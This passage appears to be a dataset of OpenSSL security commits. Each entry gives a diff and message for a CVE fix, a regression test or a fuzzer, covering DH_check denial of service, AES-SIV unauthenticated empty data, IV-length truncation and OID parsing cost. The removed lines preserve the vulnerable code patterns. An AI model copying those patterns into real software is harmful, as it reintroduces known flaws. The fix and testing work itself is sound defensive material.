    \ err;\n+\n+    ret = 1;\n+err:\n+    EVP_CIPHER_free(cipher);\n+    EVP_CIPHER_CTX_free(ctx);\n\
    +\n+    return ret;\n+}\n+\n+static int test_aes_rc4_keylen_change_cve_2023_5363(void)\n\
    +{\n+    /* RC4 test data obtained from RFC 6229 */\n+    static const struct\
    \ {\n+        unsigned char key[5];\n+        unsigned char padding[11];\n+  \
    \  } rc4_key = {\n+        {   /* Five bytes of key material */\n+           \
    \ 0x83, 0x32, 0x22, 0x77, 0x2a,\n+        },\n+        {   /* Random padding to\
    \ 16 bytes */\n+            0x80, 0xad, 0x97, 0xbd, 0xc9, 0x73, 0xdf, 0x8a, 0xaa,\
    \ 0x32, 0x91\n+        }\n+    };\n+    static const unsigned char rc4_pt[] =\
    \ {\n+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n+        0x00,\
    \ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n+    };\n+    static const unsigned\
    \ char rc4_ct[] = {\n+        0x80, 0xad, 0x97, 0xbd, 0xc9, 0x73, 0xdf, 0x8a,\n\
    +        0x2e, 0x87, 0x9e, 0x92, 0xa4, 0x97, 0xef, 0xda\n+    };\n+\n+    if (lgcyprov\
    \ == NULL)\n+        return TEST_skip(\"Test requires legacy provider to be loaded\"\
    );\n+\n+    return rc4_encrypt(rc4_key.key, sizeof(rc4_key.key),\n+          \
    \             rc4_pt, sizeof(rc4_pt), rc4_ct, sizeof(rc4_ct))\n+        && rc4_decrypt(rc4_key.key,\
    \ sizeof(rc4_key.key),\n+                       rc4_pt, sizeof(rc4_pt), rc4_ct,\
    \ sizeof(rc4_ct));\n+}\n+#endif\n+\n int setup_tests(void)\n {\n     OPTION_CHOICE\
    \ o;\n@@ -5199,6 +5446,12 @@ int setup_tests(void)\n \n     ADD_TEST(test_sign_continuation);\n\
    \ \n+    /* Test cases for CVE-2023-5363 */\n+    ADD_TEST(test_aes_gcm_ivlen_change_cve_2023_5363);\n\
    +#ifndef OPENSSL_NO_RC4\n+    ADD_TEST(test_aes_rc4_keylen_change_cve_2023_5363);\n\
    +#endif\n+\n     return 1;\n }\n "
  commit_message: 'test: add unit test for CVE-2023-5363


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: a2fe10ca39f9a8e251b98bc03c3b1bbb6ad1496f
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/evp_enc.c\n+++ b/crypto/evp/evp_enc.c\n@@ -233,6 +233,42 @@\
    \ static int evp_cipher_init_internal(EVP_CIPHER_CTX *ctx,\n             return\
    \ 0;\n     }\n \n+#ifndef FIPS_MODULE\n+    /*\n+     * Fix for CVE-2023-5363\n\
    +     * Passing in a size as part of the init call takes effect late\n+     *\
    \ so, force such to occur before the initialisation.\n+     *\n+     * The FIPS\
    \ provider's internal library context is used in a manner\n+     * such that this\
    \ is not an issue.\n+     */\n+    if (params != NULL) {\n+        OSSL_PARAM\
    \ param_lens[3] = { OSSL_PARAM_END, OSSL_PARAM_END,\n+                       \
    \              OSSL_PARAM_END };\n+        OSSL_PARAM *q = param_lens;\n+    \
    \    const OSSL_PARAM *p;\n+\n+        p = OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_KEYLEN);\
    \ \n+        if (p != NULL)\n+            memcpy(q++, p, sizeof(*q));\n+\n+  \
    \      /*\n+         * Note that OSSL_CIPHER_PARAM_AEAD_IVLEN is a synomym for\n\
    +         * OSSL_CIPHER_PARAM_IVLEN so both are covered here.\n+         */\n\
    +        p = OSSL_PARAM_locate_const(params, OSSL_CIPHER_PARAM_IVLEN);\n+    \
    \    if (p != NULL)\n+            memcpy(q++, p, sizeof(*q));\n+\n+        if\
    \ (q != param_lens) {\n+            if (!EVP_CIPHER_CTX_set_params(ctx, param_lens))\
    \ {\n+                ERR_raise(ERR_LIB_EVP, EVP_R_INVALID_LENGTH);\n+       \
    \         return 0;\n+            }\n+        }\n+    }\n+#endif\n+\n     if (enc)\
    \ {\n         if (ctx->cipher->einit == NULL) {\n             ERR_raise(ERR_LIB_EVP,\
    \ EVP_R_INITIALIZATION_ERROR);"
  commit_message: 'evp: process key length and iv length early if present


    evp_cipher_init_internal() takes a params array argument and this is processed

    late in the initialisation process for some ciphers (AEAD ones).


    This means that changing the IV length as a parameter will either truncate the

    IV (very bad if SP 800-38d section 8.2.1 is used) or grab extra uninitialised

    bytes.


    Truncation is very bad if SP 800-38d section 8.2.1 is being used to

    contruct a deterministic IV.  This leads to an instant loss of confidentiality.


    Grabbing extra bytes isn''t so serious, it will most likely result in a bad

    decryption.


    Problem reported by Tony Battersby of Cybernetics.com but earlier discovered

    and raised as issue #19822.


    Fixes CVE-2023-5363

    Fixes #19822


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: f3a7e6c057b5054aa05710f3d528b92e3e885268
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/fuzz/x509.c\n+++ b/fuzz/x509.c\n@@ -9,6 +9,7 @@\n  */\n \n #include <openssl/x509.h>\n\
    +#include <openssl/ocsp.h>\n #include <openssl/bio.h>\n #include <openssl/err.h>\n\
    \ #include <openssl/rand.h>\n@@ -17,31 +18,131 @@\n int FuzzerInitialize(int *argc,\
    \ char ***argv)\n {\n     FuzzerSetRand();\n-    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS,\
    \ NULL);\n+    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS\n+       |\
    \ OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);\n     ERR_clear_error();\n\
    \     CRYPTO_free_ex_index(0, -1);\n     return 1;\n }\n \n+static int cb(int\
    \ ok, X509_STORE_CTX *ctx)\n+{\n+    return 1;\n+}\n+\n int FuzzerTestOneInput(const\
    \ uint8_t *buf, size_t len)\n {\n     const unsigned char *p = buf;\n+    size_t\
    \ orig_len = len;\n     unsigned char *der = NULL;\n+    BIO *bio = NULL;\n+ \
    \   X509 *x509_1 = NULL, *x509_2 = NULL;\n+    X509_STORE *store = NULL;\n+  \
    \  X509_VERIFY_PARAM *param = NULL;\n+    X509_STORE_CTX *ctx = NULL;\n+    X509_CRL\
    \ *crl = NULL;\n+    STACK_OF(X509_CRL) *crls = NULL;\n+    STACK_OF(X509) *certs\
    \ = NULL;\n+    OCSP_RESPONSE *resp = NULL;\n+    OCSP_BASICRESP *bs = NULL;\n\
    +    OCSP_CERTID *id = NULL;\n+\n+    x509_1 = d2i_X509(NULL, &p, len);\n+   \
    \ if (x509_1 == NULL)\n+        goto err;\n+\n+    bio = BIO_new(BIO_s_null());\n\
    +    if (bio == NULL)\n+        goto err;\n+\n+    /* This will load and print\
    \ the public key as well as extensions */\n+    X509_print(bio, x509_1);\n+  \
    \  BIO_free(bio);\n+\n+    X509_issuer_and_serial_hash(x509_1);\n+\n+    i2d_X509(x509_1,\
    \ &der);\n+    OPENSSL_free(der);\n+\n+    len = orig_len - (p - buf);\n+    x509_2\
    \ = d2i_X509(NULL, &p, len);\n+    if (x509_2 == NULL)\n+        goto err;\n+\n\
    +    len = orig_len - (p - buf);\n+    crl = d2i_X509_CRL(NULL, &p, len);\n+ \
    \   if (crl == NULL)\n+        goto err;\n+\n+    len = orig_len - (p - buf);\n\
    +    resp = d2i_OCSP_RESPONSE(NULL, &p, len);\n+\n+    store = X509_STORE_new();\n\
    +    X509_STORE_add_cert(store, x509_2);\n \n-    X509 *x509 = d2i_X509(NULL,\
    \ &p, len);\n-    if (x509 != NULL) {\n-        BIO *bio = BIO_new(BIO_s_null());\n\
    -        /* This will load and print the public key as well as extensions */\n\
    -        X509_print(bio, x509);\n-        BIO_free(bio);\n+    param = X509_VERIFY_PARAM_new();\n\
    +    X509_VERIFY_PARAM_set_flags(param, X509_V_FLAG_NO_CHECK_TIME);\n+    X509_VERIFY_PARAM_set_flags(param,\
    \ X509_V_FLAG_X509_STRICT);\n+    X509_VERIFY_PARAM_set_flags(param, X509_V_FLAG_PARTIAL_CHAIN);\n\
    +    X509_VERIFY_PARAM_set_flags(param, X509_V_FLAG_CRL_CHECK);\n \n-        X509_issuer_and_serial_hash(x509);\n\
    +    X509_STORE_set1_param(store, param);\n \n-        i2d_X509(x509, &der);\n\
    -        OPENSSL_free(der);\n+    X509_STORE_set_verify_cb(store, cb);\n \n- \
    \       X509_free(x509);\n+    ctx = X509_STORE_CTX_new();\n+    if (ctx == NULL)\n\
    +        goto err;\n+\n+    X509_STORE_CTX_init(ctx, store, x509_1, NULL);\n+\n\
    +    if (crl != NULL) {\n+        crls = sk_X509_CRL_new_null();\n+        if\
    \ (crls == NULL)\n+            goto err;\n+\n+        sk_X509_CRL_push(crls, crl);\n\
    +        X509_STORE_CTX_set0_crls(ctx, crls);\n     }\n+\n+    X509_verify_cert(ctx);\n\
    +\n+    if (resp != NULL)\n+        bs = OCSP_response_get1_basic(resp);\n+\n\
    +    if (bs != NULL) {\n+        int status, reason;\n+        ASN1_GENERALIZEDTIME\
    \ *revtime, *thisupd, *nextupd;\n+\n+        certs = sk_X509_new_null();\n+  \
    \      if (certs == NULL)\n+            goto err;\n+\n+        sk_X509_push(certs,\
    \ x509_1);\n+        sk_X509_push(certs, x509_2);\n+\n+        OCSP_basic_verify(bs,\
    \ certs, store, OCSP_PARTIAL_CHAIN);\n+\n+        id = OCSP_cert_to_id(NULL, x509_1,\
    \ x509_2);\n+        if (id == NULL)\n+            goto err;\n+        OCSP_resp_find_status(bs,\
    \ id, &status, &reason, &revtime, &thisupd,\n+                              &nextupd);\n\
    +    }\n+\n+err:\n+    X509_STORE_CTX_free(ctx);\n+    X509_VERIFY_PARAM_free(param);\n\
    +    X509_STORE_free(store);\n+    X509_free(x509_1);\n+    X509_free(x509_2);\n\
    +    X509_CRL_free(crl);\n+    OCSP_CERTID_free(id);\n+    OCSP_BASICRESP_free(bs);\n\
    +    OCSP_RESPONSE_free(resp);\n+    sk_X509_CRL_free(crls);\n+    sk_X509_free(certs);\n\
    +\n     ERR_clear_error();\n     return 0;\n }"
  commit_message: 'Update X509 fuzzer to verify a chain


    It add supports for verifying that it''s been signed by a CA, and

    checks the CRL and OCSP status


    Can find CVE-2022-4203 and CVE-2023-0286


    Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Dmitry Belyavskiy <beldmit@gmail.com>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20243)'
  commit_sha: 399c2da08ab9c6a382f8e9950742a022e847fec0
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/dh/dh_check.c\n+++ b/crypto/dh/dh_check.c\n@@ -143,7 +143,7 @@ int\
    \ DH_check(const DH *dh, int *ret)\n #ifdef FIPS_MODULE\n     return DH_check_params(dh,\
    \ ret);\n #else\n-    int ok = 0, r;\n+    int ok = 0, r, q_good = 0;\n     BN_CTX\
    \ *ctx = NULL;\n     BIGNUM *t1 = NULL, *t2 = NULL;\n     int nid = DH_get_nid((DH\
    \ *)dh);\n@@ -172,6 +172,13 @@ int DH_check(const DH *dh, int *ret)\n        \
    \ goto err;\n \n     if (dh->params.q != NULL) {\n+        if (BN_ucmp(dh->params.p,\
    \ dh->params.q) > 0)\n+            q_good = 1;\n+        else\n+            *ret\
    \ |= DH_CHECK_INVALID_Q_VALUE;\n+    }\n+\n+    if (q_good) {\n         if (BN_cmp(dh->params.g,\
    \ BN_value_one()) <= 0)\n             *ret |= DH_NOT_SUITABLE_GENERATOR;\n   \
    \      else if (BN_cmp(dh->params.g, dh->params.p) >= 0)"
  commit_message: 'DH_check(): Do not try checking q properties if it is obviously
    invalid


    If  |q| >= |p| then the q value is obviously wrong as q

    is supposed to be a prime divisor of p-1.


    We check if p is overly large so this added test implies that

    q is not large either when performing subsequent tests using that

    q value.


    Otherwise if it is too large these additional checks of the q value

    such as the primality test can then trigger DoS by doing overly long

    computations.


    Fixes CVE-2023-3817


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>

    Reviewed-by: Todd Short <todd.short@me.com>

    (Merged from https://github.com/openssl/openssl/pull/21550)'
  commit_sha: 1c16253f3c3a8d1e25918c3f404aae6a5b0893de
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/dhtest.c\n+++ b/test/dhtest.c\n@@ -73,7 +73,7 @@ static int dh_test(void)\n\
    \         goto err1;\n \n     /* check fails, because p is way too small */\n\
    -    if (!DH_check(dh, &i))\n+    if (!TEST_true(DH_check(dh, &i)))\n        \
    \ goto err2;\n     i ^= DH_MODULUS_TOO_SMALL;\n     if (!TEST_false(i & DH_CHECK_P_NOT_PRIME)\n\
    @@ -124,6 +124,17 @@ static int dh_test(void)\n     /* We'll have a stale error\
    \ on the queue from the above test so clear it */\n     ERR_clear_error();\n \n\
    +    /* Modulus of size: dh check max modulus bits + 1 */\n+    if (!TEST_true(BN_set_word(p,\
    \ 1))\n+            || !TEST_true(BN_lshift(p, p, OPENSSL_DH_CHECK_MAX_MODULUS_BITS)))\n\
    +        goto err3;\n+\n+    /*\n+     * We expect no checks at all for an excessively\
    \ large modulus\n+     */\n+    if (!TEST_false(DH_check(dh, &i)))\n+        goto\
    \ err3;\n+\n     /*\n      * II) key generation\n      */\n@@ -138,7 +149,7 @@\
    \ static int dh_test(void)\n         goto err3;\n \n     /* ... and check whether\
    \ it is valid */\n-    if (!DH_check(a, &i))\n+    if (!TEST_true(DH_check(a,\
    \ &i)))\n         goto err3;\n     if (!TEST_false(i & DH_CHECK_P_NOT_PRIME)\n\
    \             || !TEST_false(i & DH_CHECK_P_NOT_SAFE_PRIME)"
  commit_message: 'Add a test for CVE-2023-3446


    Confirm that the only errors DH_check() finds with DH parameters with an

    excessively long modulus is that the modulus is too large. We should not

    be performing time consuming checks using that modulus.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>

    Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21451)'
  commit_sha: ede782b4c8868d1f09c9cd237f82b6f35b7dba8b
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/dh/dh_check.c\n+++ b/crypto/dh/dh_check.c\n@@ -152,6 +152,12 @@\
    \ int DH_check(const DH *dh, int *ret)\n     if (nid != NID_undef)\n         return\
    \ 1;\n \n+    /* Don't do any checks at all with an excessively large modulus\
    \ */\n+    if (BN_num_bits(dh->params.p) > OPENSSL_DH_CHECK_MAX_MODULUS_BITS)\
    \ {\n+        ERR_raise(ERR_LIB_DH, DH_R_MODULUS_TOO_LARGE);\n+        return\
    \ 0;\n+    }\n+\n     if (!DH_check_params(dh, ret))\n         return 0;\n "
  commit_message: 'Fix DH_check() excessive time with over sized modulus


    The DH_check() function checks numerous aspects of the key or parameters

    that have been supplied. Some of those checks use the supplied modulus

    value even if it is excessively large.


    There is already a maximum DH modulus size (10,000 bits) over which

    OpenSSL will not generate or derive keys. DH_check() will however still

    perform various tests for validity on such a large modulus. We introduce a

    new maximum (32,768) over which DH_check() will just fail.


    An application that calls DH_check() and supplies a key or parameters

    obtained from an untrusted source could be vulnerable to a Denial of

    Service attack.


    The function DH_check() is itself called by a number of other OpenSSL

    functions. An application calling any of those other functions may

    similarly be affected. The other functions affected by this are

    DH_check_ex() and EVP_PKEY_param_check().


    CVE-2023-3446


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>

    Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21451)'
  commit_sha: 9e0094e2aa1b3428a12d5095132f133c078d3c3d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/providers/implementations/ciphers/cipher_aes_siv.c\n+++ b/providers/implementations/ciphers/cipher_aes_siv.c\n\
    @@ -118,14 +118,18 @@ static int siv_cipher(void *vctx, unsigned char *out, size_t\
    \ *outl,\n     if (!ossl_prov_is_running())\n         return 0;\n \n-    if (inl\
    \ == 0) {\n-        *outl = 0;\n-        return 1;\n-    }\n+    /* Ignore just\
    \ empty encryption/decryption call and not AAD. */\n+    if (out != NULL) {\n\
    +        if (inl == 0) {\n+            if (outl != NULL)\n+                *outl\
    \ = 0;\n+            return 1;\n+        }\n \n-    if (outsize < inl) {\n-  \
    \      ERR_raise(ERR_LIB_PROV, PROV_R_OUTPUT_BUFFER_TOO_SMALL);\n-        return\
    \ 0;\n+        if (outsize < inl) {\n+            ERR_raise(ERR_LIB_PROV, PROV_R_OUTPUT_BUFFER_TOO_SMALL);\n\
    +            return 0;\n+        }\n     }\n \n     if (ctx->hw->cipher(ctx, out,\
    \ in, inl) <= 0)"
  commit_message: 'Do not ignore empty associated data with AES-SIV mode


    The AES-SIV mode allows for multiple associated data items

    authenticated separately with any of these being 0 length.


    The provided implementation ignores such empty associated data

    which is incorrect in regards to the RFC 5297 and is also

    a security issue because such empty associated data then become

    unauthenticated if an application expects to authenticate them.


    Fixes CVE-2023-2975


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21384)'
  commit_sha: c426c281cfc23ab182f7d7d7a35229e7db1494d9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_recp.c\n+++ b/crypto/bn/bn_recp.c\n@@ -42,7 +42,7 @@ void\
    \ BN_RECP_CTX_free(BN_RECP_CTX *recp)\n \n int BN_RECP_CTX_set(BN_RECP_CTX *recp,\
    \ const BIGNUM *d, BN_CTX *ctx)\n {\n-    if (!BN_copy(&(recp->N), d))\n+    if\
    \ (BN_is_zero(d) || !BN_copy(&(recp->N), d))\n         return 0;\n     BN_zero(&(recp->Nr));\n\
    \     recp->num_bits = BN_num_bits(d);"
  commit_message: 'Check for 0 modulus in BN_RECP_CTX_set.

    The function BN_RECP_CTX_set did not check whether arg d is zero,

    in which case an early failure should be returned to the invoker.

    This is a similar fix to the cognate defect of CVE-2015-1794.


    Fixes #21111


    CLA: trivial


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/21255)'
  commit_sha: 43596b306b1fe06da3b1a99e07c0cf235898010d
  repo_name: openssl/openssl
- commit_diff:
  - '--- a/fuzz/decoder.c

    +++ b/fuzz/decoder.c

    @@ -0,0 +1,86 @@

    +/*

    + * Copyright 2023 The OpenSSL Project Authors. All Rights Reserved.

    + *

    + * Licensed under the Apache License 2.0 (the "License");

    + * you may not use this file except in compliance with the License.

    + * You may obtain a copy of the License at

    + * https://www.openssl.org/source/license.html

    + * or in the file LICENSE in the source distribution.

    + */

    +

    +#include <openssl/decoder.h>

    +#include <openssl/err.h>

    +#include <openssl/rand.h>

    +#include "fuzzer.h"

    +

    +static ASN1_PCTX *pctx;

    +

    +int FuzzerInitialize(int *argc, char ***argv)

    +{

    +    FuzzerSetRand();

    +

    +    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS

    +                        | OPENSSL_INIT_ADD_ALL_CIPHERS

    +                        | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);

    +

    +    pctx = ASN1_PCTX_new();

    +    ASN1_PCTX_set_flags(pctx, ASN1_PCTX_FLAGS_SHOW_ABSENT

    +                              | ASN1_PCTX_FLAGS_SHOW_SEQUENCE

    +                              | ASN1_PCTX_FLAGS_SHOW_SSOF

    +                              | ASN1_PCTX_FLAGS_SHOW_TYPE

    +                              | ASN1_PCTX_FLAGS_SHOW_FIELD_STRUCT_NAME);

    +    ASN1_PCTX_set_str_flags(pctx, ASN1_STRFLGS_UTF8_CONVERT

    +                                  | ASN1_STRFLGS_SHOW_TYPE

    +                                  | ASN1_STRFLGS_DUMP_ALL);

    +

    +    ERR_clear_error();

    +    CRYPTO_free_ex_index(0, -1);

    +    return 1;

    +}

    +

    +int FuzzerTestOneInput(const uint8_t *buf, size_t len)

    +{

    +    OSSL_DECODER_CTX *dctx;

    +    EVP_PKEY *pkey = NULL;

    +    EVP_PKEY_CTX *ctx = NULL;

    +    BIO *bio;

    +

    +    bio = BIO_new(BIO_s_null());

    +    dctx = OSSL_DECODER_CTX_new_for_pkey(&pkey, NULL, NULL, NULL, 0, NULL,

    +                                                NULL);

    +    if (dctx == NULL) {

    +        return 0;

    +    }

    +    if (OSSL_DECODER_from_data(dctx, &buf, &len)) {

    +        EVP_PKEY *pkey2;

    +

    +        EVP_PKEY_print_public(bio, pkey, 1, pctx);

    +        EVP_PKEY_print_private(bio, pkey, 1, pctx);

    +        EVP_PKEY_print_params(bio, pkey, 1, pctx);

    +

    +        pkey2 = EVP_PKEY_dup(pkey);

    +        OPENSSL_assert(pkey2 != NULL);

    +        EVP_PKEY_eq(pkey, pkey2);

    +        EVP_PKEY_free(pkey2);

    +

    +        ctx = EVP_PKEY_CTX_new(pkey, NULL);

    +        EVP_PKEY_param_check(ctx);

    +        EVP_PKEY_public_check(ctx);

    +        EVP_PKEY_private_check(ctx);

    +        EVP_PKEY_pairwise_check(ctx);

    +        OPENSSL_assert(ctx != NULL);

    +        EVP_PKEY_CTX_free(ctx);

    +        EVP_PKEY_free(pkey);

    +    }

    +    OSSL_DECODER_CTX_free(dctx);

    +

    +    BIO_free(bio);

    +    ERR_clear_error();

    +    return 0;

    +}

    +

    +void FuzzerCleanup(void)

    +{

    +    ASN1_PCTX_free(pctx);

    +    FuzzerClearRand();

    +}'
  commit_message: 'Add decoder fuzzer


    This found CVE-2023-0217


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20269)'
  commit_sha: a9e6100bc98439ca787aa1fce541550ad1ff3e84
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/objects/obj_dat.c\n+++ b/crypto/objects/obj_dat.c\n@@ -464,6 +464,25\
    \ @@ int OBJ_obj2txt(char *buf, int buf_len, const ASN1_OBJECT *a, int no_name)\n\
    \     first = 1;\n     bl = NULL;\n \n+    /*\n+     * RFC 2578 (STD 58) says\
    \ this about OBJECT IDENTIFIERs:\n+     *\n+     * > 3.5. OBJECT IDENTIFIER values\n\
    +     * >\n+     * > An OBJECT IDENTIFIER value is an ordered list of non-negative\n\
    +     * > numbers. For the SMIv2, each number in the list is referred to as a\n\
    +     * > sub-identifier, there are at most 128 sub-identifiers in a value,\n\
    +     * > and each sub-identifier has a maximum value of 2^32-1 (4294967295\n\
    +     * > decimal).\n+     *\n+     * So a legitimate OID according to this RFC\
    \ is at most (32 * 128 / 7),\n+     * i.e. 586 bytes long.\n+     *\n+     * Ref:\
    \ https://datatracker.ietf.org/doc/html/rfc2578#section-3.5\n+     */\n+    if\
    \ (len > 586)\n+        goto err;\n+\n     while (len > 0) {\n         l = 0;\n\
    \         use_bn = 0;"
  commit_message: 'Restrict the size of OBJECT IDENTIFIERs that OBJ_obj2txt will translate


    OBJ_obj2txt() would translate any size OBJECT IDENTIFIER to canonical

    numeric text form.  For gigantic sub-identifiers, this would take a very

    long time, the time complexity being O(n^2) where n is the size of that

    sub-identifier.


    To mitigate this, a restriction on the size that OBJ_obj2txt() will

    translate to canonical numeric text form is added, based on RFC 2578

    (STD 58), which says this:


    > 3.5. OBJECT IDENTIFIER values

    >

    > An OBJECT IDENTIFIER value is an ordered list of non-negative numbers.

    > For the SMIv2, each number in the list is referred to as a sub-identifier,

    > there are at most 128 sub-identifiers in a value, and each sub-identifier

    > has a maximum value of 2^32-1 (4294967295 decimal).


    Fixes otc/security#96

    Fixes CVE-2023-2650


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: d63b3e7959e79f98d60760a739f7876dc5adc838
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/fuzz/pem.c\n+++ b/fuzz/pem.c\n@@ -0,0 +1,59 @@\n+/*\n+ * Copyright 2022\
    \ The OpenSSL Project Authors. All Rights Reserved.\n+ *\n+ * Licensed under the\
    \ Apache License 2.0 (the \"License\");\n+ * you may not use this file except\
    \ in compliance with the License.\n+ * You may obtain a copy of the License at\n\
    + * https://www.openssl.org/source/license.html\n+ * or in the file LICENSE in\
    \ the source distribution.\n+ */\n+\n+#include <openssl/pem.h>\n+#include <openssl/err.h>\n\
    +#include \"fuzzer.h\"\n+\n+int FuzzerInitialize(int *argc, char ***argv)\n+{\n\
    +    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS, NULL);\n+    ERR_clear_error();\n\
    +    CRYPTO_free_ex_index(0, -1);\n+    return 1;\n+}\n+\n+int FuzzerTestOneInput(const\
    \ uint8_t *buf, size_t len)\n+{\n+    BIO *in;\n+    char *name = NULL, *header\
    \ = NULL;\n+    unsigned char *data = NULL;\n+    long outlen;\n+\n+    if (len\
    \ <= 1)\n+        return 0;\n+\n+    in = BIO_new(BIO_s_mem());\n+    OPENSSL_assert((size_t)BIO_write(in,\
    \ buf + 1, len - 1) == len - 1);\n+    if (PEM_read_bio_ex(in, &name, &header,\
    \ &data, &outlen, buf[0]) == 1) {\n+\t/* Try to read all the data we get to see\
    \ if allocated properly. */\n+        BIO_write(in, name, strlen(name));\n+\t\
    BIO_write(in, header, strlen(header));\n+\tBIO_write(in, data, outlen);\n+   \
    \ }\n+    if (buf[0] & PEM_FLAG_SECURE) {\n+        OPENSSL_secure_free(name);\n\
    +        OPENSSL_secure_free(header);\n+        OPENSSL_secure_free(data);\n+\
    \    } else {\n+        OPENSSL_free(name);\n+        OPENSSL_free(header);\n\
    +        OPENSSL_free(data);\n+    }\n+\n+    BIO_free(in);\n+    ERR_clear_error();\n\
    +\n+    return 0;\n+}\n+\n+void FuzzerCleanup(void)\n+{\n+}"
  commit_message: 'Add PEM fuzzer


    This fuzzer can find CVE-2022-4450


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20242)'
  commit_sha: bc07d371865095643ec4f7190f26b174830a2f02
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/providers/implementations/kdfs/hkdf.c\n+++ b/providers/implementations/kdfs/hkdf.c\n\
    @@ -531,7 +531,7 @@ static int HKDF_Expand(const EVP_MD *evp_md,\n         if\
    \ (!HMAC_Final(hmac, prev, NULL))\n             goto err;\n \n-        copy_len\
    \ = (done_len + dig_len > okm_len) ?\n+        copy_len = (dig_len > okm_len -\
    \ done_len) ?\n                        okm_len - done_len :\n                \
    \        dig_len;\n "
  commit_message: 'Update hkdf.c to avoid potentially vulnerable code pattern


    The expression "if (a+b>c) a=c-b" is incorrect if "a+b" overflows.

    It should be replaced by "if (a>c-b) a=c-b", which avoids the

    potential overflow and is much easier to understand.


    This pattern is the root cause of CVE-2022-37454, a buffer overflow

    vulnerability in the "official" SHA-3 implementation.


    It has been confirmed that the addition in

    https://github.com/openssl/openssl/blob/master/providers/implementations/kdfs/hkdf.c#L534

    cannot overflow. So this is only a minor change proposal to avoid

    a potentially vulnerable code pattern and to improve readability.

    More information: https://github.com/github/codeql/pull/12036#issuecomment-1466056959


    CLA: trivial


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20990)'
  commit_sha: 56a51b5a1ecd54eadc80bed4bfe5044a340787c1
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_asm.c\n+++ b/crypto/bn/bn_asm.c\n@@ -381,25 +381,33 @@ BN_ULONG\
    \ bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const BN_ULONG *b,\n #ifndef OPENSSL_SMALL_FOOTPRINT\n\
    \     while (n & ~3) {\n         t1 = a[0];\n-        t2 = b[0];\n-        r[0]\
    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[0];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[0] = t1;\n+   \
    \     c += (t1 > t2);\n         t1 = a[1];\n-        t2 = b[1];\n-        r[1]\
    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[1];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[1] = t1;\n+   \
    \     c += (t1 > t2);\n         t1 = a[2];\n-        t2 = b[2];\n-        r[2]\
    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[2];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[2] = t1;\n+   \
    \     c += (t1 > t2);\n         t1 = a[3];\n-        t2 = b[3];\n-        r[3]\
